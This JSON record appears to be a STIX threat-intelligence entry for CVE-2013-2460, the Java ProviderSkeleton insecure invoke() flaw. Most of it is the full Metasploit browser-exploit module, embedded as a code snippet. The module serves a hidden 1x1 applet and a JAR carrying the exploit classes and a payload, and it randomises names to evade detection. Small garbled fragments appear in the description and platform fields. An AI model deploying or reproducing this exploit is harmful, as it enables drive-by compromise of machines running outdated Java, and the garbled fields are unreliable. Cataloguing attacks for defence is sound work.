{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7546490d-423d-4990-a2f3-613de226c7c4",
    "created": "2024-08-14T17:05:54.956522Z",
    "modified": "2024-08-14T17:05:54.956526Z",
    "name": "Java Applet ProviderSkeleton Insecure Invoke Method",
    "description": " This module abuses the insecure invoke() method of the ProviderSkeleton class that allows to call arbitrary static methods with user supplied arguments. The vulnerability affects Java version 7u21 and earlier.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_jre17_provider_skeleton.rb",
            "external_id": "java_jre17_provider_skeleton.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2460"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/javacpujun2013-1899847.html"
        },
        {
            "source_name": "reference",
            "url": "http://hg.openjdk.java.net/jdk7u/jdk7u/jdk/rev/160cde99bb1a"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-explorations.com/materials/SE-2012-01-ORACLE-12.pdf"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-explorations.com/materials/se-2012-01-61.zip"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking # Because there isn't click2play bypass, plus now Java Security Level High by default\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  include Msf::Exploit::Remote::BrowserAutopwn\n  autopwn_info({ :javascript => false })\n\n  EXPLOIT_STRING = \"Exploit\"\n\n  def initialize( info = {} )\n\n    super( update_info( info,\n      'Name'          => 'Java Applet ProviderSkeleton Insecure Invoke Method',\n      'Description'   => %q{\n          This module abuses the insecure invoke() method of the ProviderSkeleton class that\n        allows to call arbitrary static methods with user supplied arguments. The vulnerability\n        affects Java version 7u21 and earlier.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Adam Gowdiak', # Vulnerability discovery according to Oracle's advisory and also POC\n          'Matthias Kaiser' # Metasploit module\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2013-2460' ],\n          [ 'OSVDB', '94346' ],\n          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpujun2013-1899847.html'],\n          [ 'URL', 'http://hg.openjdk.java.net/jdk7u/jdk7u/jdk/rev/160cde99bb1a' ],\n          [ 'URL', 'http://www.security-explorations.com/materials/SE-2012-01-ORACLE-12.pdf' ],\n          [ 'URL', 'http://www.security-explorations.com/materials/se-2012-01-61.zip' ]\n        ],\n      'Platform'      => %w{ java linux osx win },\n      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Platform' => ['java'],\n              'Arch' => ARCH_JAVA,\n            }\n          ],\n          [ 'Windows x86 (Native Payload)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Mac OS X x86 (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Linux x86 (Native Payload)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86,\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-06-18'\n    ))\n  end\n\n  def randomize_identifier_in_jar(jar, identifier)\n    identifier_str = rand_text_alpha(identifier.length)\n    jar.entries.each { |entry|\n      entry.name.gsub!(identifier, identifier_str)\n      entry.data = entry.data.gsub(identifier, identifier_str)\n    }\n  end\n\n\n  def setup\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-2460\", \"Exploit.class\")\n    @exploit_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-2460\", \"ExpProvider.class\")\n    @provider_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-2460\", \"DisableSecurityManagerAction.class\")\n    @action_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n\n    @exploit_class_name = rand_text_alpha(EXPLOIT_STRING.length)\n    @exploit_class.gsub!(EXPLOIT_STRING, @exploit_class_name)\n\n    super\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"handling request for #{request.uri}\")\n\n    case request.uri\n    when /\\.jar$/i\n      jar = payload.encoded_jar\n      jar.add_file(\"#{@exploit_class_name}.class\", @exploit_class)\n      jar.add_file(\"ExpProvider.class\", @provider_class)\n      jar.add_file(\"DisableSecurityManagerAction.class\", @action_class)\n      randomize_identifier_in_jar(jar, \"metasploit\")\n      randomize_identifier_in_jar(jar, \"payload\")\n      jar.build_manifest\n\n      send_response(cli, jar, { 'Content-Type' => \"application/octet-stream\" })\n    when /\\/$/\n      payload = regenerate_payload(cli)\n      if not payload\n        print_error(\"Failed to generate the payload.\")\n        send_not_found(cli)\n        return\n      end\n      send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })\n    else\n      send_redirect(cli, get_resource() + '/', '')\n    end\n\n  end\n\n  def generate_html\n    html = %Q|\n    <html>\n    <body>\n    <applet archive=\"#{rand_text_alpha(rand(5) + 3)}.jar\" code=\"#{@exploit_class_name}.class\" width=\"1\" height=\"1\"></applet>\n    </body>\n    </html>\n    |\n    return html\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-18",
    "x_mitre_platforms": [
        "linux'"
    ]
}